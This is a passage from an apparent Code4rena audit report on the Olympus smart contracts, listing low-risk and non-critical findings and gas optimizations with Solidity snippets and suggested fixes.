[ret2basic](https://github.com/code-423n4/2022-08-olympus-findings/issues/325), [hansfriese](https://github.com/code-423n4/2022-08-olympus-findings/issues/384), [Funen](https://github.com/code-423n4/2022-08-olympus-findings/issues/436), [PaludoX0](https://github.com/code-423n4/2022-08-olympus-findings/issues/198), [Picodes](https://github.com/code-423n4/2022-08-olympus-findings/issues/425), [grGred](https://github.com/code-423n4/2022-08-olympus-findings/issues/141), [okkothejawa](https://github.com/code-423n4/2022-08-olympus-findings/issues/444), [Trust](https://github.com/code-423n4/2022-08-olympus-findings/issues/90), [natzuu](https://github.com/code-423n4/2022-08-olympus-findings/issues/493), [itsmeSTYJ](https://github.com/code-423n4/2022-08-olympus-findings/issues/121), [0x040](https://github.com/code-423n4/2022-08-olympus-findings/issues/327), [d3e4](https://github.com/code-423n4/2022-08-olympus-findings/issues/454), [p&#95;crypt0](https://github.com/code-423n4/2022-08-olympus-findings/issues/463), [0xkatana](https://github.com/code-423n4/2022-08-olympus-findings/issues/150), [Margaret](https://github.com/code-423n4/2022-08-olympus-findings/issues/160), [8olidity](https://github.com/code-423n4/2022-08-olympus-findings/issues/37), [LeoS](https://github.com/code-423n4/2022-08-olympus-findings/issues/93), [medikko](https://github.com/code-423n4/2022-08-olympus-findings/issues/504), [ne0n](https://github.com/code-423n4/2022-08-olympus-findings/issues/154), [EthLedger](https://github.com/code-423n4/2022-08-olympus-findings/issues/282), [enckrish](https://github.com/code-423n4/2022-08-olympus-findings/issues/365), [Diraco](https://github.com/code-423n4/2022-08-olympus-findings/issues/430), [djxploit](https://github.com/code-423n4/2022-08-olympus-findings/issues/69), [JansenC](https://github.com/code-423n4/2022-08-olympus-findings/issues/229), [indijanc](https://github.com/code-423n4/2022-08-olympus-findings/issues/424), [CRYP70](https://github.com/code-423n4/2022-08-olympus-findings/issues/43), [apostle0x01](https://github.com/code-423n4/2022-08-olympus-findings/issues/451), [cloudjunky](https://github.com/code-423n4/2022-08-olympus-findings/issues/153), [MasterCookie](https://github.com/code-423n4/2022-08-olympus-findings/issues/252), and [0x85102](https://github.com/code-423n4/2022-08-olympus-findings/issues/288).*\n\n## Summary\n\n| Risk | Title                                                                                                    |\n| ---- | -------------------------------------------------------------------------------------------------------- |\n| L&#8209;01  | Operator: incorrect accounting for fee-on-transfer reserve token                                         |\n| L-02  | BondCallback: incorrect accounting if quoteToken is rebase token                                         |\n| L-03  | PRICE: unsafe cast for `numObservations`                                                                 |\n| L-04  | Operator: unsafe cast for decimals                                                                       |\n| L-05  | BondCallback: operator is not set `constructor`                                                          |\n| L-06  | Operator: missing check for configParmas[0] (cushionFactor) in the constructor                           |\n| L-07  | Kernel: misplaced zero address check for `changeKernel`                                                  |\n| L-08  | BondCallback, Operator: upon module's upgrade, the token approval should be revoked                      |\n| L-09  | Heart: if the `_issueReward` fails the heart beat will revert                                            |\n| N-01  | Kernel: missing zero address check for `executor` and `admin`                                            |\n| N-02  | INSTR, Governance: upon module's upgrade, all instruction data should be carried over to the new modules |\n| N-03  | RANGE, PRICE: unused import of `FullMath`                                                                |\n| N&#8209;04  | PRICE: stale price                                                                                       |\n\n## [L-01] Operator: incorrect accounting for fee-on-transfer reserve token\n\n*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L330>\n\nIf the reserve token is fee-to-transfer token and the user is buying ohm, the `Operator::swap` will incorrectly assume the `amountIn_` value is transferred, which fails to consider the fees. If the fee is rounded up, the attacker can purchase ohm without giving any assets to the treasury. It may not be profitable for the attacker, but it may cause devaluing of the ohm. However, the loss will be limited to the capacity.\n\n```solidity\n// Operator::swap\n// if(tokenIn_ == reserve) : buying ohm\n329             /// Transfer reserves to treasury\n330             reserve.safeTransferFrom(msg.sender, address(TRSRY), amountIn_);\n```\n\n## [L-02] BondCallback: incorrect accounting if quoteToken is rebase token\n\n*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/BondCallback.sol#L114>\n\nIf the quoteToken is rebase token, the priorBalances may change due to rebasing or airdrop. It may result to an incorrect accounting. However, whether it is exploitable depends on the Bond market's logic.<br>\nWith the current logic, it just checks whether the balance is increased more than the `inputAmount_`, so it is harder to exploit, compare to the alternative logic of using the difference in balances as the input amount. However, it also introduces the possibility of paying the users less than they deserve.\n\n```solidity\n// Callback::callback\n113         // Check that quoteTokens were transferred prior to the call\n114         if (quoteToken.balanceOf(address(this)) < priorBalances[quoteToken] + inputAmount_)\n115             revert Callback_TokensNotReceived();\n```\n\n## [L-03] PRICE: unsafe cast for `numObservations`\n\n*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L97>\n*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L249-L257>\n*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L281-L289>\n\nThe `movingAverageDuration` and `observationFrequency` are uint48. So `movingAverageDuration / observationFrequency` may overflow when casted to uint32. In the below snippet, line 281, the array will be set based on the uint256 value, but the `numObservations` is casted down to uint32. It may result in different `numObservations` and the length of `observations` array.\nHowever, given the large numbers, the attempt to set such a large number as the parameters will likely to fail with \"out of gas\" error, since the length of the array `observations` is ridiculously large in this case. Yet, it is probably safe to set some upper limit for the `numObservations` or use safeCast.\n\n```solidity\n// modules/PRICE::constructor\n  97         numObservations = uint32(movingAverageDuration_ / observationFrequency_);\n\n// modules/PRICE::changeObservationFrequency\n  280         // Store blank observations array of new size\n  281         observations = new uint256[](newObservations);\n  282\n  283         // Set initialized to false and update state variables\n  284         initialized = false;\n  285         lastObservationTime = 0;\n  286         _movingAverage = 0;\n  287         nextObsIndex = 0;\n  288         observationFrequency = observationFrequency_;\n  289         numObservations = uint32(newObservations);\n```\n\n## [L-04] Operator: unsafe cast for decimals\n\n*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L372>\n*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L427>\n*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L431-L434>\n*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L375-L379>\n\nIn the `Operator::_activate` decimal values were casted to `int8` and `uint8` back and forth. Since there is no check, those values can potentially overflow/underflow. However, if it happens the exponent in the line 376 will like to revert due to too large numbers. Besides, if the price decimals are that big, this may not be the biggest problem to face.\n\n```solidity\n// policies/Operator.sol::_activate\n\n372             int8 scaleAdjustment = int8(ohmDecimals) - int8(reserveDecimals) + (priceDecimals / 2);\n\n375             uint256 oracleScale = 10**uint8(int8(PRICE.decimals()) - priceDecimals);\n376             uint256 bondScale = 10 **\n377                 uint8(\n378                     36 + scaleAdjustment + int8(reserveDecimals) - int8(ohmDecimals) - priceDecimals\n379                 );\n```\n\n## [L-05] BondCallback: operator is not set `constructor`\n\n*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/BondCallback.sol#L38-L45>\n\nIf the `operator` is not set, the `callback` function will revert so, it is crucial to set the `operator` before any operation. However, it was not set in the `constructor`, but should be set separately by calling `setOperator`.\n\n## [L-06] Operator: missing check for configParmas\\[0] (cushionFactor) in the constructor\n\n*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L92-L150>\n*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L516-L524>\n\nThe `Operator::constructor` does not check the condition of the `cushionFactor`. Below is the condition for the `cushionFactor` checked in the `Operator::setCushionFactor`.\n\n```solidity\n// Operator::setCushionFactor\n\n516     function setCushionFactor(uint32 cushionFactor_) external onlyRole(\"operator_policy\") {\n517         /// Confirm factor is within allowed values\n518         if (cushionFactor_ > 10000 || cushionFactor_ < 100) revert Operator_InvalidParams();\n519\n520         /// Set factor\n521         _config.cushionFactor = cushionFactor_;\n522\n523         emit CushionFactorChanged(cushionFactor_);\n524     }\n```\n\n## [L-07] Kernel: misplaced zero address check for `changeKernel`\n\n*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L76-L78>\n*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L254-L257>\n\nCurrently, the check for the `Kernel` to be a contract (also not to be the zero address), is in the current `Kernel` implementation. However, no modules and policies have the logic to ensure this as they inherit from `KernelAdapter`, which will just set the new kernel without a question. This will work well as long as the new Kernel has the similar logic to check the next Kernel's integrity. However, if the logic is forgotten, there is no other safe guard to ensure that the next kernel is not a zero address and is a contract.\nSince `Kernel` is absolutely needed for this system's functionality, there is no possible case that the Kernel should be the zero address. Therefore, it is probably safe to add the checking logic to the `KernelAdapter`, so every module and policy will check for the next Kernel. It costs more gas since the check is done multiple times, but still arguably it is worth the cost, since Kernel is core part of the system and it will not updated very often.\n\n```solidity\n// KernelAdapter::changeKernel\n 76     function changeKernel(Kernel newKernel_) external onlyKernel {\n 77         kernel = newKernel_;\n 78     }\n\n// Kernel::executeAction\n254         } else if (action_ == Actions.MigrateKernel) {\n255             ensureContract(target_);\n256             _migrateKernel(Kernel(target_));\n257         }\n```\n\n## [L-08] BondCallback, Operator: upon module's upgrade, the token approval should be revoked\n\n*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/BondCallback.sol#L57>\n*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L167>\n\nThe `BondCallback` and `Operator` approves ohm to the `MINTR` module in the `configureDependencies`. However, there is no logic to revoke those approvals (e.i. approve to zero). In the case of the `MINTR` has some bugs, it may be desirable to be able to revoke the approvals.\n\n```solidity\n// Operator::configureDependencies\n167         ohm.safeApprove(address(MINTR), type(uint256).max);\n```\n\n## [L-09] Heart: if the issueReward fails the heart beat will revert\n\n*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L106>\n\nIf the `_issueReward` reverts, for example, because the token balance is too low, the `beat` will as well revert, due to the `safeTransfer`. One might consider not to revert even in the case the `_issueReward` reverts.\n\n## [N-01] Kernel: missing zero address check for `executor` and `admin`\n\n*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L250-L253>\n\nThe `executor` and `admin` are not checked for the zero address when set by the `Kernel::executeAction`.\n\n```solidity\n// Kernel::executeAction\n250         } else if (action_ == Actions.ChangeExecutor) {\n251             executor = target_;\n252         } else if (action_ == Actions.ChangeAdmin) {\n253             admin = target_;\n```\n\n## [N-02] INSTR, Governance: upon module's upgrade, all instruction data should be carried over to the new modules\n\n*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L167>\n*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L187>\n\nThe `Governance`'s logic will break if the `INSTR` module is upgraded to a new contract without having the same instructions data,  since the `proposalId`'s the `Governance` is using are bound to the `INSTR` module.\n\n## [N-03] RANGE, PRICE: unused import of `FullMath`\n\n*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/RANGE.sol#L18>\n*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L23>\n\nThe modules `RANGE` and `PRICE` imports `FullMath`, but it is not used.\n\n```solidity\n// modules/PRICE.sol\n 22 contract OlympusPrice is Module {\n 23     using FullMath for uint256;\n```\n\n## [N-04] PRICE: stale price\n\nThere is no indicator whether the price information is up-to-date. If the price information is not properly updated, the other contracts will keep using the data resulting in incorrect prices for swap.\n\n\n\n***\n\n# Gas Optimizations\n\nFor this contest, 91 reports were submitted by wardens detailing gas optimizations. The [report highlighted below](https://github.com/code-423n4/2022-08-olympus-findings/issues/39) by **pfapostol** received the top score from the judge.\n\n*The following wardens also submitted reports: [0xSmartContract](https://github.com/code-423n4/2022-08-olympus-findings/issues/249), [0x1f8b](https://github.com/code-423n4/2022-08-olympus-findings/issues/135), [LeoS](https://github.com/code-423n4/2022-08-olympus-findings/issues/46), [Tomo](https://github.com/code-423n4/2022-08-olympus-findings/issues/146), [0xNazgul](https://github.com/code-423n4/2022-08-olympus-findings/issues/438), [m&#95;Rassska](https://github.com/code-423n4/2022-08-olympus-findings/issues/471), [Aymen0909](https://github.com/code-423n4/2022-08-olympus-findings/issues/453), [ReyAdmirado](https://github.com/code-423n4/2022-08-olympus-findings/issues/44), [gogo](https://github.com/code-423n4/2022-08-olympus-findings/issues/156), [IllIllI](https://github.com/code-423n4/2022-08-olympus-findings/issues/269), [ret2basic](https://github.com/code-423n4/2022-08-olympus-findings/issues/324), [c3phas](https://github.com/code-423n4/2022-08-olympus-findings/issues/449), [ajtra](https://github.com/code-423n4/2022-08-olympus-findings/issues/437), [JC](https://github.com/code-423n4/2022-08-olympus-findings/issues/498), [&#95;&#95;141345&#95;&#95;](https://github.com/code-423n4/2022-08-olympus-findings/issues/263), [TomJ](https://github.com/code-423n4/2022-08-olympus-findings/issues/296), [ignacio](https://github.com/code-423n4/2022-08-olympus-findings/issues/167), [Deivitto](https://github.com/code-423n4/2022-08-olympus-findings/issues/462), [grGred](https://github.com/code-423n4/2022-08-olympus-findings/issues/140), [Rolezn](https://github.com/code-423n4/2022-08-olympus-findings/issues/196), [0xkatana](https://github.com/code-423n4/2022-08-olympus-findings/issues/4), [Sm4rty](https://github.com/code-423n4/2022-08-olympus-findings/issues/232), [brgltd](https://github.com/code-423n4/2022-08-olympus-findings/issues/501), [oyc&#95;109](https://github.com/code-423n4/2022-08-olympus-findings/issues/6), [robee](https://github.com/code-423n4/2022-08-olympus-findings/issues/16), [0x040](https://github.com/code-423n4/2022-08-olympus-findings/issues/319), [Bnke0x0](https://github.com/code-423n4/2022-08-olympus-findings/issues/19), [exolorkistis](https://github.com/code-423n4/2022-08-olympus-findings/issues/312), [ladboy233](https://github.com/code-423n4/2022-08-olympus-findings/issues/60), [durianSausage](https://github.com/code-423n4/2022-08-olympus-findings/issues/29), [erictee](https://github.com/code-423n4/2022-08-olympus-findings/issues/5), [martin](https://github.com/code-423n4/2022-08-olympus-findings/issues/190), [carlitox477](https://github.com/code-423n4/2022-08-olympus-findings/issues/128), [zishansami](https://github.com/code-423n4/2022-08-olympus-findings/issues/96), [Rohan16](https://github.com/code-423n4/2022-08-olympus-findings/issues/361), [rbserver](https://github.com/code-423n4/2022-08-olympus-findings/issues/491), [Dionysus](https://github.com/code-423n4/2022-08-olympus-findings/issues/59), [tnevler](https://github.com/code-423n4/2022-08-olympus-findings/issues/385), [GalloDaSballo](https://github.com/code-423n4/2022-08-olympus-findings/issues/377), [StevenL](https://github.com/code-423n4/2022-08-olympus-findings/issues/432), [fatherOfBlocks](https://github.com/code-423n4/2022-08-olympus-findings/issues/21), [CertoraInc](https://github.com/code-423n4/2022-08-olympus-findings/issues/237), [ch0bu](https://github.com/code-423n4/2022-08-olympus-findings/issues/58), [jag](https://github.com/code-423n4/2022-08-olympus-findings/issues/119), [ElKu](https://github.com/code-423n4/2022-08-olympus-findings/issues/133), [lukris02](https://github.com/code-423n4/2022-08-olympus-findings/issues/354), [0xDjango](https://github.com/code-423n4/2022-08-olympus-findings/issues/218), [medikko](https://github.com/code-423n4/2022-08-olympus-findings/issues/481), [Noah3o6](https://github.com/code-423n4/2022-08-olympus-findings/issues/24), [Saintcode&#95;](https://github.com/code-423n4/2022-08-olympus-findings/issues/147), [CodingNameKiki](https://github.com/code-423n4/2022-08-olympus-findings/issues/241), [Ruhum](https://github.com/code-423n4/2022-08-olympus-findings/issues/139), [chrisdior4](https://github.com/code-423n4/2022-08-olympus-findings/issues/291), [Amithuddar](https://github.com/code-423n4/2022-08-olympus-findings/issues/398), [cccz](https://github.com/code-423n4/2022-08-olympus-findings/issues/251), [bobirichman](https://github.com/code-423n4/2022-08-olympus-findings/issues/164), [cRat1st0s](https://github.com/code-423n4/2022-08-olympus-findings/issues/48), [Guardian](https://github.com/code-423n4/2022-08-olympus-findings/issues/182), [0x85102](https://github.com/code-423n4/2022-08-olympus-findings/issues/289), [Shishigami](https://github.com/code-423n4/2022-08-olympus-findings/issues/174), [Metatron](https://github.com/code-423n4/2022-08-olympus-findings/issues/145), [RaymondFam](https://github.com/code-423n4/2022-08-olympus-findings/issues/181), [0xNineDec](https://github.com/code-423n4/2022-08-olympus-findings/issues/108), [Waze](https://github.com/code-423n4/2022-08-olympus-findings/issues/306), [RoiEvenHaim](https://github.com/code-423n4/2022-08-olympus-findings/issues/10), [Chandr](https://github.com/code-423n4/2022-08-olympus-findings/issues/294), [apostle0x01](https://github.com/code-423n4/2022-08-olympus-findings/issues/459), [Funen](https://github.com/code-423n4/2022-08-olympus-findings/issues/435), [d3e4](https://github.com/code-423n4/2022-08-olympus-findings/issues/478), [natzuu](https://github.com/code-423n4/2022-08-olympus-findings/issues/480), [aviggiano](https://github.com/code-423n4/2022-08-olympus-findings/issues/31), [djxploit](https://github.com/code-423n4/2022-08-olympus-findings/issues/68), [peiw](https://github.com/code-423n4/2022-08-olympus-findings/issues/417), [JansenC](https://github.com/code-423n4/2022-08-olympus-findings/issues/230), [karanctf](https://github.com/code-423n4/2022-08-olympus-findings/issues/310), [kris](https://github.com/code-423n4/2022-08-olympus-findings/issues/330), [simon135](https://github.com/code-423n4/2022-08-olympus-findings/issues/41), [Tagir2003](https://github.com/code-423n4/2022-08-olympus-findings/issues/158), [Diraco](https://github.com/code-423n4/2022-08-olympus-findings/issues/443), [delfin454000](https://github.com/code-423n4/2022-08-olympus-findings/issues/359), [SooYa](https://github.com/code-423n4/2022-08-olympus-findings/issues/401), [rokinot](https://github.com/code-423n4/2022-08-olympus-findings/issues/455), [ne0n](https://github.com/code-423n4/2022-08-olympus-findings/issues/73), [rvierdiiev](https://github.com/code-423n4/2022-08-olympus-findings/issues/152), [The&#95;GUILD](https://github.com/code-423n4/2022-08-olympus-findings/issues/323), [newfork01](https://github.com/code-423n4/2022-08-olympus-findings/issues/3), [Jeiwan](https://github.com/code-423n4/2022-08-olympus-findings/issues/26), [sikorico](https://github.com/code-423n4/2022-08-olympus-findings/issues/161), [Fitraldys](https://github.com/code-423n4/2022-08-olympus-findings/issues/456), and [hyh](https://github.com/code-423n4/2022-08-olympus-findings/issues/488).*\n\n## Summary\n\nGas savings are estimated using the gas report of existing `FORGE_GAS_REPORT=true forge test` tests (the sum of all deployment costs and the sum of the costs of calling all methods) and may vary depending on the implementation of the fix. I keep my version of the fix for each finding and can provide them if you need.<br>\nSome optimizations (mostly logical) cannot be scored with a exact gas quantity.\n\n|         | Issue                                                                                                                              | Instances | Estimated gas(deployments) | Estimated gas(method call) |\n| :-----: | :--------------------------------------------------------------------------------------------------------------------------------- | :-------: | :------------------------: | :------------------------: |\n|  **G&#8209;01**  | Replace `modifier` with `function`                                                                                                 |     6     |           460 154          |              -             |\n|  **G-02**  | `storage` pointer to a structure is cheaper than copying each value of the structure into `memory`, same for `array` and `mapping` |     7     |           188 639          |            5 032           |\n|  **G-03**  | Using `private` rather than `public` for constants, saves gas                                                                      |     8     |           45 857           |             308            |\n|  **G-04**  | Use elementary types or a user-defined `type` instead of a `struct` that has only one member                                       |     1     |           30 714           |            1 037           |\n|  **G-05**  | State variables should be cached in stack variables rather than re-reading them from storage                                       |     7     |           24 021           |             614            |\n|  **G-06**  | Using bools for storage incurs overhead                                                                                            |     6     |           23 611           |            4 485           |\n|  **G-07**  | State variables can be packed into fewer storage slots                                                                             |     3     |           23 292           |            1 711           |\n|  **G-08**  | Expressions that cannot be overflowed can be unchecked                                                                             |     5     |           23 016           |              -             |\n|  **G-09**  | Increment optimization                                                                                                             |     18    |              ↓             |              ↓             |\n| **G-09.1** | Prefix increments are cheaper than postfix increments, especially when it's used in for-loops                                      |     3     |             400            |              -             |\n| **G&#8209;09.2** | `<x> = <x> + 1` even more efficient than pre increment                                                                             |     18    |           14 217           |              -             |\n|  **G-10** | Use named `returns` for local variables where it is possible                                                                       |     3     |            5 400           |              -             |\n|  **G-11** | `x = x + y` is cheaper than `x += y;`                                                                                              |     6     |            5 000           |              -             |\n|  **G-12** | Deleting a struct is cheaper than creating a new struct with null values.                                                          |     1     |            4 207           |              -             |\n|  **G-13** | Don't compare boolean expressions to boolean literals                                                                              |     2     |            1 607           |              -             |\n|  **G&#8209;14** | `revert` operator should be in the code as early as reasonably possible                                                            |     3     |             200            |           1 559+           |\n|  **G&#8209;15** | Duplicated require()/revert() checks should be refactored to a modifier or function                                                |     4     |              -             |            8 111           |\n\n**Total: 83 instances over 15 issues**\n\n***\n\n## [G-01]  Replace `modifier` with `function` (6 instances)\n\nModifiers make code more elegant, but cost more than normal functions.\n\nDeployment Gas Saved: **460 154**\n\nAll modifiers except `permissioned` due to unresolved error flow.\n\n*   src/Kernel.sol:[70-73](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L70-L73), [119-123](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L119-L123), [223-232](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L223-L232)\n\n```solidity\n70     modifier onlyKernel() {\n71         if (msg.sender != address(kernel)) revert KernelAdapter_OnlyKernel(msg.sender);\n72         _;\n73     }\n...\n119    modifier onlyRole(bytes32 role_) {\n120        Role role = toRole(role_);\n121        if (!kernel.hasRole(msg.sender, role)) revert Policy_OnlyRole(role);\n122        _;\n123    }\n...\n223    modifier onlyExecutor() {\n224        if (msg.sender != executor) revert Kernel_OnlyExecutor(msg.sender);\n225        _;\n226    }\n227\n228    /// @notice Modifier to check if caller is the roles admin.\n229    modifier onlyAdmin() {\n230        if (msg.sender != admin) revert Kernel_OnlyAdmin(msg.sender);\n231        _;\n232    }\n```\n\n*   src/policies/Operator.sol:[188-191](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L188-L191)\n\n```solidity\n188    modifier onlyWhileActive() {\n189        if (!active) revert Operator_Inactive();\n190        _;\n191    }\n```\n\n*   [src/modules/PRICE.sol](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol)\n\n```solidity\nif (!initialized) revert Price_NotInitialized(); // @note 4 instances\n```\n\n## [G-02]  `storage` pointer to a structure is cheaper than copying each value of the structure into `memory`, same for `array` and `mapping` (7 instances)\n\nDeployment Gas Saved: **188 639**<br>\nMethod Call Gas Saved: **5 032**<br>\n\nIt may not be obvious, but every time you copy a storage `struct`/`array`/`mapping` to a `memory` variable, you are literally copying each member by reading it from `storage`, which is expensive. And when you use the `storage` keyword, you are just storing a pointer to the storage, which is much cheaper.\n\n*   src/Kernel.sol:[379](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L379)\n\n```solidity\n379        Policy[] memory dependents = moduleDependents[keycode_];\n```\n\nfix(the same for others):\n\n```solidity\nPolicy[] storage dependents = moduleDependents[keycode_];\n```\n\n*   src/policies/BondCallback.sol:[179](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/BondCallback.sol#L179)\n\n```solidity\n179        uint256[2] memory marketAmounts = _amountsPerMarket[id_];\n```\n\n*   src/policies/Governance.sol:[206](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L206)\n\n```solidity\n206        ProposalMetadata memory proposal = getProposalMetadata[proposalId_];\n```\n\n*   src/policies/Operator.sol:[205-206](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L205-L206), [384-385](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L384-L385), [439-440](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L439-L440), [666](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L666)\n\n```solidity\n205        /// Cache config in memory\n206        Config memory config_ = _config;\n...\n384            /// Cache config struct to avoid multiple SLOADs\n385            Config memory config_ = _config;\n...\n439            /// Cache config struct to avoid multiple SLOADs\n440            Config memory config_ = _config;\n...\n666        Regen memory regen = _status.low;\n```\n\n## [G-03]  Using `private` rather than `public` for constants, saves gas (8 instances)\n\nIf needed, the value can be read from the verified contract source code. Savings are due to the compiler not having to create non-payable getter functions for deployment calldata, and not adding another entry to the method ID table\n\nDeployment Gas Saved: **45 857**<br>\nMethod Call Gas Saved: **308**<br>\n\n*   src/policies/Governance.sol:[119-137](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L119-L137)\n\n```solidity\n119    /// @notice The amount of votes a proposer needs in order to submit a proposal as a percentage of total supply (in basis points).\n120    /// @dev    This is set to 1% of the total supply.\n121    uint256 public constant SUBMISSION_REQUIREMENT = 100;\n122\n123    /// @notice Amount of time a submitted proposal has to activate before it expires.\n124    uint256 public constant ACTIVATION_DEADLINE = 2 weeks;\n125\n126    /// @notice Amount of time an activated proposal must stay up before it can be replaced by a new activated proposal.\n127    uint256 public constant GRACE_PERIOD = 1 weeks;\n128\n129    /// @notice Endorsements required to activate a proposal as percentage of total supply.\n130    uint256 public constant ENDORSEMENT_THRESHOLD = 20;\n131\n132    /// @notice Net votes required to execute a proposal on chain as a percentage of total supply.\n133    uint256 public constant EXECUTION_THRESHOLD = 33;\n134\n135    /// @notice Required time for a proposal to be active before it can be executed.\n136    /// @dev    This amount should be greater than 0 to prevent flash loan attacks.\n137    uint256 public constant EXECUTION_TIMELOCK = 3 days;\n```\n\n*   src/policies/Operator.sol:[89](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L89)\n\n```solidity\n89     uint32 public constant FACTOR_SCALE = 1e4;\n```\n\n*   src/modules/RANGE.sol:[65](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/RANGE.sol#L65)\n\n```solidity\n65     uint256 public constant FACTOR_SCALE = 1e4;\n```\n\n## [G-04] Use elementary types or a user-defined `type` instead of a `struct` that has only one member (1 instances)\n\nDeployment Gas Saved: **30 714**<br>\nMethod Call Gas Saved: **1 037**<br>\n\n*   src/modules/RANGE.sol:[33-35](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/RANGE.sol#L33-L35)\n\n```solidity\n33     struct Line {\n34         uint256 price; // Price for the specified level\n35     }\n```\n\n## [G-05] State variables should be cached in stack variables rather than re-reading them from storage\n\nDeployment Gas Saved: **24 021**<br>\nMethod Call Gas Saved: **614**<br>\n\nSLOADs are expensive (100 gas after the 1st one) compared to MLOADs/MSTOREs (3 gas each). Storage values read multiple times should instead be cached in memory the first time (costing 1 SLOAD) and then read from this cache to avoid multiple SLOADs.\n\n*   src/policies/Heart.sol:[112-113](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Heart.sol#L112-L113)\n\n```solidity\n112        rewardToken.safeTransfer(to_, reward);\n113        emit RewardIssued(to_, reward);\n```\n\nfix:\n\n```solidity\n        uint256 reward = reward;\n        rewardToken.safeTransfer(to_, reward);\n        emit RewardIssued(to_, reward);\n```\n\n*   src/policies/BondCallback.sol:[68-75](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/BondCallback.sol#L68-L75)\n\n```solidity\n68         Keycode TRSRY_KEYCODE = TRSRY.KEYCODE();\n69         Keycode MINTR_KEYCODE = MINTR.KEYCODE();\n70\n71         requests = new Permissions[](4);\n72         requests[0] = Permissions(TRSRY_KEYCODE, TRSRY.setApprovalFor.selector);\n73         requests[1] = Permissions(TRSRY_KEYCODE, TRSRY.withdrawReserves.selector);\n74         requests[2] = Permissions(MINTR_KEYCODE, MINTR.mintOhm.selector);\n75         requests[3] = Permissions(MINTR_KEYCODE, MINTR.burnOhm.selector);\n```\n\nfix(similar for other policies):\n\n```solidity\n    OlympusTreasury ltrsry = TRSRY;\n    OlympusMinter lmintr = MINTR;\n    Keycode TRSRY_KEYCODE = ltrsry.KEYCODE();\n    Keycode MINTR_KEYCODE = lmintr.KEYCODE();\n\n    requests = new Permissions[](4);\n\n    requests[0] = Permissions(TRSRY_KEYCODE, ltrsry.setApprovalFor.selector);\n    requests[1] = Permissions(TRSRY_KEYCODE, ltrsry.withdrawReserves.selector);\n    requests[2] = Permissions(MINTR_KEYCODE, lmintr.mintOhm.selector);\n    requests[3] = 